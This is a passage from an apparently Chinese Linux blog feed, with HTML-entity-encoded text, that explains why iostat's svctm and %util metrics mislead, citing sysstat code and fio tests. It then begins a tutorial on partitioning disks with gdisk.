&#x6216;w/s &#x6765;&#x63A8;&#x7B97;&#x78C1;&#x76D8;&#x7684;IOPS&#x662F;&#x4E0D;&#x5BF9;&#x7684;&#x3002;</p><p>&#x90A3;&#x4E48;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#x7528;&#x6765;&#x8861;&#x91CF;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x9971;&#x548C;&#x7A0B;&#x5EA6;&#x5462;&#x3002;&#x5F88;&#x9057;&#x61BE;&#xFF0C;iostat&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x6307;&#x6807;&#x53EF;&#x4EE5;&#x8861;&#x91CF;&#x78C1;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x9971;&#x548C;&#x5EA6;&#x3002;</p><h2 id="svctm&#x7684;&#x8BA1;&#x7B97;"><a href="#svctm&#x7684;&#x8BA1;&#x7B97;" class="headerlink" title="svctm&#x7684;&#x8BA1;&#x7B97;"></a>svctm&#x7684;&#x8BA1;&#x7B97;</h2><p>&#x5BF9;&#x4E8E;iostat&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x800C;&#x8A00;&#xFF0C;%util&#x56FA;&#x7136;&#x4F1A;&#x7ED9;&#x4EBA;&#x5E26;&#x6765;&#x4E00;&#x5B9A;&#x7684;&#x8BEF;&#x89E3;&#x548C;&#x82E6;&#x6270;&#xFF0C;&#x4F46;&#x662F;svctm&#x7ED9;&#x4EBA;&#x5E26;&#x6765;&#x7684;&#x8BEF;&#x89E3;&#x66F4;&#x591A;&#x3002;&#x4E00;&#x76F4;&#x4EE5;&#x6765;&#xFF0C;&#x4EBA;&#x4EEC;&#x5E0C;&#x671B;&#x4E86;&#x89E3;&#x5757;&#x8BBE;&#x5907;&#x5904;&#x7406;&#x5355;&#x4E2A;IO&#x7684;service time&#xFF0C;&#x8FD9;&#x4E2A;&#x6307;&#x6807;&#x76F4;&#x63A5;&#x5730;&#x53CD;&#x5E94;&#x4E86;&#x786C;&#x76D8;&#x7684;&#x80FD;&#x529B;&#x3002;</p><p>&#x56DE;&#x5230;&#x8D85;&#x5E02;&#x6536;&#x94F6;&#x8FD9;&#x4E2A;&#x7C7B;&#x6BD4;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x6536;&#x94F6;&#x5458;&#x662F;&#x4E2A;&#x8001;&#x624B;&#xFF0C;&#x64CD;&#x4F5C;&#x6D41;&#xFF0C;&#x6548;&#x7387;&#x5F88;&#x9AD8;&#xFF0C;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x80AF;&#x5B9A;&#x66F4;&#x613F;&#x610F;&#x6392;&#x8FD9;&#x4E00;&#x961F;&#x3002;&#x4F46;&#x662F;&#x5982;&#x679C;&#x6536;&#x94F6;&#x5458;&#x662F;&#x4E2A;&#x65B0;&#x624B;&#xFF0C;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#x4E0D;&#x719F;&#x6089;&#xFF0C;&#x52A8;&#x4F5C;&#x6162;&#xFF0C;&#x6548;&#x7387;&#x5F88;&#x4F4E;&#xFF0C;&#x90A3;&#x4E48;&#x540C;&#x6837;&#x591A;&#x7684;&#x4EFB;&#x52A1;&#xFF0C;&#x5C31;&#x4F1A;&#x82B1;&#x8D39;&#x66F4;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x3002;&#x56E0;&#x6B64;IO&#x7684;&#x5E73;&#x5747;service time&#xFF08;&#x4E0D;&#x5305;&#x62EC;&#x6392;&#x961F;&#x65F6;&#x95F4;&#xFF09;&#x662F;&#x975E;&#x5E38;&#x6709;&#x610F;&#x4E49;&#x7684;&#x3002;</p><p>&#x4F46;&#x662F;service time&#x548C;iostat&#x65E0;&#x5173;&#xFF0C;iostat&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x80FD;&#x591F;&#x63D0;&#x4F9B;&#x8FD9;&#x65B9;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x800C;svctm&#x8FD9;&#x4E2A;&#x8F93;&#x51FA;&#x7ED9;&#x4E86;&#x4EBA;&#x4EEC;&#x8FD9;&#x79CD;&#x7F8E;&#x597D;&#x7684;&#x671F;&#x5F85;&#xFF0C;&#x5374;&#x53EA;&#x80FD;&#x8BA9;&#x4EBA;&#x7A7A;&#x6B22;&#x559C;&#x3002;</p><p>&#x4ECE;&#x73B0;&#x5728;&#x8D77;&#xFF0C;&#x6211;&#x4EEC;&#x8BB0;&#x4F4F;&#xFF0C;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x4ECE;svctm&#x4E2D;&#x5F97;&#x5230;&#x81EA;&#x5DF1;&#x671F;&#x5F85;&#x7684;service time&#x8FD9;&#x4E2A;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x5176;&#x5B9E;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x610F;&#x4E49;&#xFF0C;&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x8FD9;&#x4E2A;&#x503C;&#x4E0D;&#x662F;&#x72EC;&#x7ACB;&#x7684;&#xFF0C;&#x5B83;&#x662F;&#x6839;&#x636E;&#x5176;&#x4ED6;&#x503C;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x7684;&#x3002;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void compute_ext_disk_stats(struct stats_disk *sdc, struct stats_disk *sdp,</span><br><span class="line">                            unsigned long long itv, struct ext_disk_stats *xds) </span><br><span class="line">{</span><br><span class="line">        double tput </span><br><span class="line">                = ((double) (sdc-&gt;nr_ios - sdp-&gt;nr_ios)) * HZ / itv; </span><br><span class="line">                </span><br><span class="line">        xds-&gt;util  = S_VALUE(sdp-&gt;tot_ticks, sdc-&gt;tot_ticks, itv);</span><br><span class="line">        xds-&gt;svctm = tput ? xds-&gt;util / tput : 0.0; </span><br><span class="line">        ...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x76D8;&#x7684;&#x80FD;&#x529B;&#x5F88;&#x5F3A;&#x608D;&#xFF0C;&#x968F;&#x673A;&#x5C0F;IO&#xFF08;4K&#xFF09;fio&#x6D4B;&#x8BD5;&#x4E2D;&#x6211;&#x4EEC;&#x4F1A;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x73B0;&#x8C61;&#xFF1A;&#x5F53;IOPS&#x4E3A;1000&#x7684;&#x65F6;&#x5019;&#xFF0C;iosta&#x8F93;&#x51FA;&#x7684;svctm&#x4E3A;1(ms)&#xFF0C;&#x5F53;IOPS&#x4E3A;2000&#x7684;&#x65F6;&#x5019;&#xFF0C;iostat&#x8F93;&#x51FA;&#x7684;svctm&#x4E3A;0.5(ms),&#x5F53;IOPS&#x4E3A;3000&#x7684;&#x65F6;&#x5019;&#xFF0C;iostat&#x8F93;&#x51FA;&#x7684;svctm&#x4E3A;0.33&#x3002;&#x539F;&#x56E0;&#x5176;&#x5B9E;&#x65E0;&#x4ED6;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;%util&#x90FD;&#x662F;100%&#xFF0C;&#x5373;&#x5F53;&#x91C7;&#x6837;&#x5468;&#x671F;&#x662F;1&#x79D2;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7528;&#x6EE1;&#x4E86;1&#x79D2;&#xFF0C;tput&#x5C31;&#x662F;fio&#x6307;&#x5B9A;&#x7684;&#x2013;rate-iops &#x5373;1000&#x3001;2000&#x3001;3000&#xFF0C;&#x56E0;&#x6B64;&#x7B97;&#x51FA;&#x6765;svctm&#x4E3A;&#x5BF9;&#x5E94;&#x7684;1&#x3001;0.5&#x3001;0.33&#x3002;<br><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/iops_1000_svctm.png" title="iops_1000_svctm"><br><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/iops_2000_svctm.png" title="iops_2000_svctm"><br><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/iops_3000_svctm.png" title="iops_3000_svctm"><br><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/iops_5000_svctm.png" title="iops_5000_svctm"></p><blockquote><p>&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x7684;&#x76D8;sdg&#x662F;iSCSI&#xFF0C;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#x662F;&#x7531;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x63D0;&#x4F9B;&#xFF0C;&#x4E0D;&#x8981;&#x95EE;&#x6211;&#x4E3A;&#x4EC0;&#x4E48;&#x5355;&#x4E2A;&#x76D8;&#x968F;&#x673A;IOPS&#x80FD;&#x65E0;&#x538B;&#x529B;&#x7684;&#x5230;5000&#xFF09;</p></blockquote><p>&#x56E0;&#x6B64;&#x4ECE;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x770B;&#xFF0C;&#x628A;iostat&#x7684;&#x8F93;&#x51FA;&#x4E2D;&#x7684;svctm&#x770B;&#x4F5C;&#x662F;IO&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x662F;&#x76F8;&#x5F53;&#x4E0D;&#x9760;&#x8C31;&#x7684;&#x3002;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x5E26;&#x6765;&#x7684;&#x8BEF;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5FFD;&#x7565;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x3002;</p><p>&#x65E2;&#x7136;svctm&#x4E0D;&#x80FD;&#x53CD;&#x6620;IO&#x5904;&#x7406;&#x65F6;&#x95F4;&#xFF0C;&#x90A3;&#x4E48;&#x6709;&#x6CA1;&#x6709;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6D4B;&#x91CF;&#x5757;&#x8BBE;&#x5907;&#x7684;IO&#x5E73;&#x5747;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x5462;&#xFF1F;&#x5F88;&#x9057;&#x61BE;iostat&#x662F;&#x505A;&#x4E0D;&#x5230;&#x7684;&#x3002;&#x4F46;&#x662F;&#x53EA;&#x8981;&#x601D;&#x60F3;&#x4E0D;&#x6ED1;&#x5761;&#xFF0C;&#x529E;&#x6CD5;&#x603B;&#x6BD4;&#x56F0;&#x96BE;&#x591A;&#xFF0C;blktrace&#x8FD9;&#x4E2A;&#x795E;&#x5668;&#x53EF;&#x80FD;&#x5F97;&#x5230;&#x8FD9;&#x4E2A;&#x8BBE;&#x5907;&#x7684;IO&#x5E73;&#x5747;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3002;</p><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x53E6;&#x4E00;&#x4E2A;&#x5929;&#x5730;&#x1F607;&#x3002;</p><h2 id="&#x5C3E;&#x58F0;"><a href="#&#x5C3E;&#x58F0;" class="headerlink" title="&#x5C3E;&#x58F0;"></a>&#x5C3E;&#x58F0;</h2><p>iostat&#x80FD;&#x591F;&#x63D0;&#x4F9B;&#x7ED9;&#x6211;&#x4EEC;&#x7684;&#x4FE1;&#x606F;&#x5C31;&#x8FD9;&#x4E48;&#x591A;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x6790;&#x6211;&#x4EEC;&#x671F;&#x5F85;&#x80FD;&#x591F;&#x5F97;&#x5230;&#x5757;&#x8BBE;&#x5907;&#x5904;&#x7406;IO&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x8FD9;&#x5C31;&#x8981;&#x9760;blocktrace&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x4E86;&#x3002;blktrace&#x53EF;&#x4EE5;&#x8BB2;IO&#x8DEF;&#x5F84;&#x5206;&#x6BB5;&#xFF0C;&#x5206;&#x522B;&#x7EDF;&#x8BA1;&#x5404;&#x6BB5;&#x7684;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#x3002;</p><p>&#x672C;&#x6587;&#x5927;&#x91CF;&#x53C2;&#x8003;vmunix&#x7684;<a href="http://linuxperf.com/?p=156" target="_blank" rel="noopener">&#x5BB9;&#x6613;&#x88AB;&#x8BEF;&#x8BFB;&#x7684;IOSTAT</a>&#xFF0C;&#x4EE5;&#x53CA;<a href="http://ykrocku.github.io/blog/2014/04/11/diskstats/" target="_blank" rel="noopener">&#x6DF1;&#x5165;&#x5206;&#x6790;diskstats</a>&#xFF0C;&#x5176;&#x4E2D;&#x7B2C;&#x4E8C;&#x7BC7;&#x6587;&#x7AE0;&#x7ED9;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;IO PATH&#x7684;&#x6D41;&#x7A0B;&#x56FE;&#xFF0C;&#x975E;&#x5E38;&#x6709;&#x7528;&#x3002;&#x7B2C;&#x4E8C;&#x7BC7;&#x6587;&#x7AE0;&#x4E2D;&#x968F;&#x7740;&#x4EE3;&#x7801;&#x6F14;&#x8FDB;&#x6709;&#x4E00;&#x4E9B;&#x53D8;&#x5316;&#xFF0C;&#x672C;&#x6587;&#x91C7;&#x7528;&#x7684;&#x6BD4;&#x8F83;&#x65B0;&#x7684;Linux Kernel code&#x505A;&#x4ECB;&#x7ECD;&#xFF0C;&#x540C;&#x65F6;&#x6F14;&#x7B97;io_ticks&#x548C;time_in_queue&#x90E8;&#x5206;&#x7B2C;&#x4E8C;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x6709;&#x9519;&#x8BEF;&#xFF0C;&#x4E5F;&#x4E00;&#x5E76;&#x4FEE;&#x6B63;&#x4E86;&#x3002;&#x4E0D;&#x8FC7;&#x7455;&#x4E0D;&#x63A9;&#x745C;&#xFF0C;&#x8FD9;&#x4E24;&#x7BC7;&#x90FD;&#x662F;&#x975E;&#x5E38;&#x68D2;&#x7684;&#x6587;&#x7AE0;&#x3002;&#x5411;&#x524D;&#x8F88;&#x81F4;&#x656C;&#x3002;</p><h6 id="&#x672C;&#x6587;&#x6765;&#x81EA;&#x4E8E;Bean-Li"><a href="#&#x672C;&#x6587;&#x6765;&#x81EA;&#x4E8E;Bean-Li" class="headerlink" title="&#x672C;&#x6587;&#x6765;&#x81EA;&#x4E8E;Bean Li"></a>&#x672C;&#x6587;&#x6765;&#x81EA;&#x4E8E;<a href="http://bean-li.github.io/dive-into-iostat/" target="_blank" rel="noopener">Bean Li</a></h6><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h3 id=&quot;iostat&amp;#x
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>gdisk_常用操作</title>
    <link href="https://jiemin.wang/2019/03/11/gdisk-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"/>
    <id>https://jiemin.wang/2019/03/11/gdisk-常用操作/</id>
    <published>2019-03-11T11:09:53.000Z</published>
    <updated>2019-03-11T11:27:36.137Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h4 id="&#x4F20;&#x7EDF;&#x7684;&#x8001;&#x724C;&#x7684;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x662F;fdisk&#xFF0C;&#x4F46;&#x662F;fdisk&#x51FA;&#x9053;&#x592A;&#x65E9;&#xFF0C;&#x53EA;&#x652F;&#x6301;MBR&#xFF08;Master-Boot-Record&#xFF09;&#xFF0C;&#x5E76;&#x4E0D;&#x652F;&#x6301;GPT&#xFF08;GUID-Partition-Table&#xFF09;&#xFF0C;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x8D85;&#x8FC7;2T&#x7684;&#x78C1;&#x76D8;&#xFF0C;&#x56E0;&#x6B64;gdisk-parted&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x6A2A;&#x7A7A;&#x51FA;&#x4E16;&#x3002;"><a href="#&#x4F20;&#x7EDF;&#x7684;&#x8001;&#x724C;&#x7684;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x662F;fdisk&#xFF0C;&#x4F46;&#x662F;fdisk&#x51FA;&#x9053;&#x592A;&#x65E9;&#xFF0C;&#x53EA;&#x652F;&#x6301;MBR&#xFF08;Master-Boot-Record&#xFF09;&#xFF0C;&#x5E76;&#x4E0D;&#x652F;&#x6301;GPT&#xFF08;GUID-Partition-Table&#xFF09;&#xFF0C;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x8D85;&#x8FC7;2T&#x7684;&#x78C1;&#x76D8;&#xFF0C;&#x56E0;&#x6B64;gdisk-parted&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x6A2A;&#x7A7A;&#x51FA;&#x4E16;&#x3002;" class="headerlink" title="&#x4F20;&#x7EDF;&#x7684;&#x8001;&#x724C;&#x7684;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x662F;fdisk&#xFF0C;&#x4F46;&#x662F;fdisk&#x51FA;&#x9053;&#x592A;&#x65E9;&#xFF0C;&#x53EA;&#x652F;&#x6301;MBR&#xFF08;Master Boot Record&#xFF09;&#xFF0C;&#x5E76;&#x4E0D;&#x652F;&#x6301;GPT&#xFF08;GUID Partition Table&#xFF09;&#xFF0C;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x8D85;&#x8FC7;2T&#x7684;&#x78C1;&#x76D8;&#xFF0C;&#x56E0;&#x6B64;gdisk parted&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x6A2A;&#x7A7A;&#x51FA;&#x4E16;&#x3002;"></a>&#x4F20;&#x7EDF;&#x7684;&#x8001;&#x724C;&#x7684;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x662F;fdisk&#xFF0C;&#x4F46;&#x662F;fdisk&#x51FA;&#x9053;&#x592A;&#x65E9;&#xFF0C;&#x53EA;&#x652F;&#x6301;MBR&#xFF08;Master Boot Record&#xFF09;&#xFF0C;&#x5E76;&#x4E0D;&#x652F;&#x6301;GPT&#xFF08;GUID Partition Table&#xFF09;&#xFF0C;&#x65E0;&#x6CD5;&#x64CD;&#x4F5C;&#x8D85;&#x8FC7;2T&#x7684;&#x78C1;&#x76D8;&#xFF0C;&#x56E0;&#x6B64;gdisk parted&#x7B49;&#x5206;&#x533A;&#x5DE5;&#x5177;&#x6A2A;&#x7A7A;&#x51FA;&#x4E16;&#x3002;</h4><h4 id="gdisk&#x548C;parted&#x90FD;&#x66FE;&#x7ECF;&#x7528;&#x8FC7;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x66F4;&#x559C;&#x6B22;gdisk&#xFF0C;&#x56E0;&#x4E3A;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;gdisk-&#x4E0A;&#x627F;fdisk&#xFF0C;&#x6CA1;&#x6709;&#x592A;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x8D1F;&#x62C5;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;QA&#x6D4B;&#x51FA;&#x8FC7;&#xFF0C;parted&#x65B9;&#x5F0F;&#x5206;&#x533A;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x4F7F;&#x7528;&#x4E0A;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#x3002;"><a href="#gdisk&#x548C;parted&#x90FD;&#x66FE;&#x7ECF;&#x7528;&#x8FC7;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x66F4;&#x559C;&#x6B22;gdisk&#xFF0C;&#x56E0;&#x4E3A;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;gdisk-&#x4E0A;&#x627F;fdisk&#xFF0C;&#x6CA1;&#x6709;&#x592A;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x8D1F;&#x62C5;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;QA&#x6D4B;&#x51FA;&#x8FC7;&#xFF0C;parted&#x65B9;&#x5F0F;&#x5206;&#x533A;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x4F7F;&#x7528;&#x4E0A;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#x3002;" class="headerlink" title="gdisk&#x548C;parted&#x90FD;&#x66FE;&#x7ECF;&#x7528;&#x8FC7;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x66F4;&#x559C;&#x6B22;gdisk&#xFF0C;&#x56E0;&#x4E3A;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;gdisk &#x4E0A;&#x627F;fdisk&#xFF0C;&#x6CA1;&#x6709;&#x592A;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x8D1F;&#x62C5;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;QA&#x6D4B;&#x51FA;&#x8FC7;&#xFF0C;parted&#x65B9;&#x5F0F;&#x5206;&#x533A;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x4F7F;&#x7528;&#x4E0A;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#x3002;"></a>gdisk&#x548C;parted&#x90FD;&#x66FE;&#x7ECF;&#x7528;&#x8FC7;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x66F4;&#x559C;&#x6B22;gdisk&#xFF0C;&#x56E0;&#x4E3A;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;gdisk &#x4E0A;&#x627F;fdisk&#xFF0C;&#x6CA1;&#x6709;&#x592A;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x8D1F;&#x62C5;&#x3002;&#x53E6;&#x5916;&#x6211;&#x4EEC;QA&#x6D4B;&#x51FA;&#x8FC7;&#xFF0C;parted&#x65B9;&#x5F0F;&#x5206;&#x533A;&#xFF0C;&#x5728;&#x67D0;&#x4E9B;&#x4F7F;&#x7528;&#x4E0A;&#x4F1A;&#x6709;&#x95EE;&#x9898;&#x3002;</h4><h2 id="&#x4F7F;&#x7528;&#x65B9;&#x6CD5;"><a href="#&#x4F7F;&#x7528;&#x65B9;&#x6CD5;" class="headerlink" title="&#x4F7F;&#x7528;&#x65B9;&#x6CD5;"></a>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;</h2><h4 id="&#x9996;&#x5148;&#xFF0C;&#x6211;&#x6709;&#x4E00;&#x4E2A;sdd&#xFF0C;&#x4F5C;&#x4E3A;&#x6211;&#x64CD;&#x4F5C;&#x7684;&#x5BF9;&#x8C61;&#x3002;"><a href="#&#x9996;&#x5148;&#xFF0C;&#x6211;&#x6709;&#x4E00;&#x4E2A;sdd&#xFF0C;&#x4F5C;&#x4E3A;&#x6211;&#x64CD;&#x4F5C;&#x7684;&#x5BF9;&#x8C61;&#x3002;" class="headerlink" title="&#x9996;&#x5148;&#xFF0C;&#x6211;&#x6709;&#x4E00;&#x4E2A;sdd&#xFF0C;&#x4F5C;&#x4E3A;&#x6211;&#x64CD;&#x4F5C;&#x7684;&#x5BF9;&#x8C61;&#x3002;"></a>&#x9996;&#x5148;&#xFF0C;&#x6211;&#x6709;&#x4E00;&#x4E2A;sdd&#xFF0C;&#x4F5C;&#x4E3A;&#x6211;&#x64CD;&#x4F5C;&#x7684;&#x5BF9;&#x8C61;&#x3002;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># lsblk</span></span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT</span><br><span class="line">fd0      2:0    1     4K  0 disk </span><br><span class="line">sda      8:0    0    40G  0 disk </span><br><span class="line">&#x251C;&#x2500;sda1   8:1    0  30.5M  0 part </span><br><span class="line">&#x251C;&#x2500;sda2   8:2    0 488.3M  0 part </span><br><span class="line">&#x251C;&#x2500;sda3   8:3    0  31.1G  0 part /</span><br><span class="line">&#x251C;&#x2500;sda4   8:4    0     8G  0 part [SWAP]</span><br><span class="line">&#x2514;&#x2500;sda5   8:5    0 387.8M  0 part </span><br><span class="line">sdb      8:16   0    50G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdb1   8:17   0     4G  0 part </span><br><span class="line">&#x2514;&#x2500;sdb2   8:18   0    46G  0 part /data/osd.4</span><br><span class="line">sdc      8:32   0    50G  0 disk </span><br><span class="line">&#x251C;&#x2500;sdc1   8:33   0     4G  0 part </span><br><span class="line">&#x2514;&#x2500;sdc2   8:34   0    46G  0 part /data/osd.5</span><br><span class="line">sdd      8:48   0   500G  0 disk </span><br><span class="line">sr0     11:0    1   1.6G  0 rom</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x67E5;&#x770B;help&#x4FE1;&#x606F;"><a href="#&#x67E5;&#x770B;help&#x4FE1;&#x606F;" class="headerlink" title="&#x67E5;&#x770B;help&#x4FE1;&#x606F;"></a><strong>&#x67E5;&#x770B;help&#x4FE1;&#x606F;</strong></h4><h5 id="&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;&#x8F93;&#x5165;h&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;"><a href="#&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;&#x8F93;&#x5165;h&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;" class="headerlink" title="&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;&#x8F93;&#x5165;h&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;"></a>&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;&#x4E4B;&#x540E;&#xFF0C;&#x8F93;&#x5165;h&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</h5><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="built_in">test</span>:~<span class="comment"># gdisk /dev/sdd</span></span><br><span class="line">GPT fdisk (gdisk) version 0.8.1</span><br><span class="line"></span><br><span class="line">Partition table scan:</span><br><span class="line">  MBR: protective</span><br><span class="line">  BSD: not present</span><br><span class="line">  APM: not present</span><br><span class="line">  GPT: present</span><br><span class="line"></span><br><span class="line">Found valid GPT with protective MBR; using GPT.</span><br><span class="line"></span><br><span class="line">Command (? <span class="keyword">for</span> <span class="built_in">help</span>): h  </span><br><span class="line">bback up GPT data to a file</span><br><span class="line">cchange a partition<span class="string">&apos;s name</span></span><br><span class="line"><span class="string">ddelete a partition</span></span><br><span class="line"><span class="string">ishow detailed information on a partition</span></span><br><span class="line"><span class="string">llist known partition types</span></span><br><span class="line"><span class="string">nadd a new partition</span></span><br><span class="line"><span class="string">ocreate a new empty GUID partition table (GPT)</span></span><br><span class="line"><span class="string">pprint the partition table</span></span><br><span class="line"><span class="string">qquit without saving changes</span></span><br><span class="line"><span class="string">rrecovery and transformation options (experts only)</span></span><br><span class="line"><span class="string">ssort partitions</span></span><br><span class="line"><span class="string">tchange a partition&apos;</span>s <span class="built_in">type</span> code</span><br><span class="line">vverify disk</span><br><span class="line">wwrite 